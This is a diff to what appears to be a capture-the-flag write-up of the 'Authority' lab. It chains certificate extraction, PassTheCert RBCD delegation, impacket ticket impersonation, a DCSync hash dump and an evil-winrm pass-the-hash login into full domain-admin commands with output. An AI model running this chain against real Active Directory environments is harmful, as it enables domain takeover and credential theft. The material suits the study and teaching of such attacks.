@@ -602,8 +602,9 @@ The certificate and private key is saved to the ```administrator_authority.pfx``
 administrator_authority.pfx
 ```
  Let's try to use the ```certify auth``` command to grab grab the administrator's TGT and NTHASH.
+ 
 ```console
-certipy auth -pfx administrator_authority.pfx -debug
+0ph3@parrot~$ certipy auth -pfx administrator_authority.pfx -debug
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Found multiple identifications in certificate
@@ -618,9 +619,120 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 ```
 Looks like that failed. After researching the ```KDC_ERR_PADATA_TYPE_NOSUPP``` error, it appears that the domain controller is not configured to use PKINIT authentication. According to this [article](https://www.prosec-networks.com/en/blog/adcs-privescaas/), PKINIT is the kerberos authentication method that enables pre-authentication using certificates. The articles details an alternative method of certificate authentication and exploitation though. It's possible to use Schannel to authenticated against an ldaps server using X.509 certificates. The article links to the PassTheCert tool which takes advantage of this and grant a machine account we control [Resource Based Constrained Delegation (RBCD).](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd) over ther Domain Controller.
 
+### PassTheCert RBCD
+
 In short, since we have genericWrite access to the domain account RBCD through the ldaps certificate authentication, we can edit the DC's msDS-AllowedToActOnBehalfOfOtherIdentity and add our machine account's ( ```HACK01$```) SID to gain delegation over the DC. This will allow us to request a service ticket to the DC for any user we wish to impersonate([Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket).
 
 Let's clone the PassTheTicket tool
-### PassTheCert RBCD
-The 
+```console
+0ph3@parrot~$ git clone https://github.com/AlmondOffSec/PassTheCert.git
+Cloning into 'PassTheCert'...                                                                                                                                                                 
+remote: Enumerating objects: 133, done.
+remote: Counting objects: 100% (11/11), done.
+remote: Compressing objects: 100% (11/11), done.       
+remote: Total 133 (delta 0), reused 0 (delta 0), pack-reused 122
+Receiving objects: 100% (133/133), 48.71 KiB | 702.00 KiB/s, done.                                                                                                                            
+Resolving deltas: 100% (58/58), done.
+```
 
+Certificate authentication using the ```PassTheCert``` tool requires us to extract the cert and private key from our pfx cert.
+```console
+0ph3@parrot~$ python3 passthecert.py -h
+<SNIP>
+Authentication:
+  -dc-host hostname     Hostname of the domain controller to use. If omitted, the domain part (FQDN) specified in the account parameter will be used
+  -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.
+  -crt user.crt         User's certificate
+  -key user.key         User's private key
+```
+
+Extracting the cert's key
+```console
+0ph3@parrot~$ openssl pkcs12 -in administrator_authority.pfx -nocerts -out admin.key
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+```
+
+Extracting the crt from the .pfx
+```console
+0ph3@parrot~$ openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out admin.crt
+Enter Import Password:
+```
+
+Let's use ```PassTheCert``` to set RBCD right for our ```HACK01$``` machine over the domain controller ```AUTHORITY$```
+```console
+0ph3@parrot~$ python3 passthecert.py -dc-ip 10.10.11.222  -domain authority.htb -crt admin.crt -key admin.key -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'HACK01$'
+Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
+
+Enter PEM pass phrase:
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] HACK01$ can now impersonate users on AUTHORITY$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     HACK01$      (S-1-5-21-622327497-3269355298-2248959698-11604)
+```
+We can now use ```impacket-getST``` to impersonate the Administrator accountand obtain the TGT.
+
+```console
+0ph3@parrot~$ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/HACK01$:55a4a721e13c7bcfc8ac37bf6bd287f2'
+Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+We get a ```Clock skew``` error because our attack machine and the DC do not have synchronized times within 5 minutes of each other.
+Let's fix that using ```ntpdate```
+
+```console
+0ph3@parrot~$ sudo ntpdate 10.10.11.222
+08 Jan 22:04:55 ntpdate[783273]: step time server 10.10.11.222 offset +43204.320471 sec
+```
+
+```console
+0ph3@parrot~$ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/HACK01$:55a4a721e13c7bcfc8ac37bf6bd287f2'
+Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+
+We can use the Domain Admin's TGT to request a DCsync and extract their nthash.
+```console
+0ph3@parrot~$ KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
+Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
+svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
+AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:9d641019d580fc2aaed5aed7fee0a3ac:::
+HACK01$:11603:aad3b435b51404eeaad3b435b51404ee:1baffafa84162a4cc0319b55853b94e9:::
+[*] Cleaning up... 
+```
+Passing the hash gets us admin access to the DC through winRM.
+```console
+┌─[✗]─[root@parrot]─[/htb/vpn]
+└──╼ #evil-winrm -i 10.10.11.222 --user Administrator -H 6961f422924da90a6928197429eea4ed
+                                        
+Evil-WinRM shell v3.5
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; dir ..\desktop
+htb\administrator
+
+
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/10/2024   5:46 PM             34 root.txt
+```
